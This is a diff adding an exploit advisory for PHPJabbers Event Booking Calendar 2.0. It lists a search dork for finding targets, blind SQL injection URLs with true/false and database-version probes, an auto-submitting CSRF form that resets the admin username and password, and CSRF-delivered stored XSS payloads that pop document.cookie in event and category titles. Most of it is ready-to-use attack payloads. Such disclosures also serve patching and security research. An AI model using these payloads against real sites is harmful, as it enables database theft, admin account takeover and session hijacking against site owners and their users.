@@ -1,0 +1,93 @@
+Event Booking Calendar V2.0 - Multiple Vulnerabilities
+====================================================================
+
+####################################################################
+.:. Author         : HackXBack
+.:. Contact        : h-b@usa.com
+.:. Home           : http://www.iphobos.com/blog/
+.:. Script         : www.phpjabbers.com/event-booking-calendar/
+.:. Dork           : inurl:"load-calendar.php"
+####################################################################
+
+===[ Exploit ]===
+
+[1] multiple Blind Ijection
+============================
+
+www.site.com/script/load-calendar.php?view=1&month=6&year=2013&cid=1[inject]
+www.site.com/script/load-calendar.php?cid=1[inject]
+
+www.site.com/script/load-calendar.php?view=1&month=6&year=2013&cid=1+and+1=1
+>>True
+www.site.com/script/load-calendar.php?view=1&month=6&year=2013&cid=1+and+1=2
+>>False
+
+www.site.com/script/load-calendar.php?view=1&month=6&year=2013&cid=1+and+substring(@@version,1,1)=5
+>>True
+www.site.com/script/load-calendar.php?view=1&month=6&year=2013&cid=1+and+substring(@@version,1,1)=4
+>>False
+
+
+
+[2] Cross Site Request Forgery
+==============================
+
+[Change Username/Password Admin]
+
+<html>
+<body onload="document.form0.submit();">
+<form method="POST" name="form0" action="
+http://site/index.php?controller=AdminOptions&action=update">
+<input type="hidden" name="options_update" value="1"/>
+<input type="hidden" name="tab_id" value="tabs-1"/>
+<input type="hidden" name="username" value="admin"/>
+<input type="hidden" name="password" value="password"/>
+</form>
+
+</body>
+</html>
+
+[3] Multiple Cross Site Scripting
+=================================
+
+# CSRF with XSS Exploit:
+
+I. Xss In Event
+
+
+<html>
+<body onload="document.form0.submit();">
+<form method="POST" name="form0" action="
+http://site/index.php?controller=AdminEvents&action=create">
+<input type="hidden" name="event_create" value="1"/>
+<input type="hidden" name="category_id" value="2"/>
+<input type="hidden" name="event_title"
+value="<script>alert(document.cookie);</script>"/>
+<input type="hidden" name="event_description" value="12"/>
+<input type="hidden" name="event_max_people" value="12"/>
+<input type="hidden" name="event_color" value="FFCC00"/>
+<input type="hidden" name="start[1]" value="2014-01-11 00:00"/>
+<input type="hidden" name="end[1]" value="2014-01-11 00:00"/>
+<input type="hidden" name="title[]" value="Regular price"/>
+<input type="hidden" name="price[]" value="888"/>
+<input type="hidden" name="repeat_every" value=""/>
+<input type="hidden" name="repeat_ends" value="2014-01-11"/>
+</form>
+</body>
+</html>
+
+II. Xss In Categories
+
+
+<html>
+<body onload="document.form0.submit();">
+<form method="POST" name="form0" action="
+http://site/index.php?controller=AdminCategories&action=create">
+<input type="hidden" name="category_create" value="1"/>
+<input type="hidden" name="category_title"
+value="<script>alert(document.cookie);</script>"/>
+</form>
+</body>
+</html>
+
+####################################################################
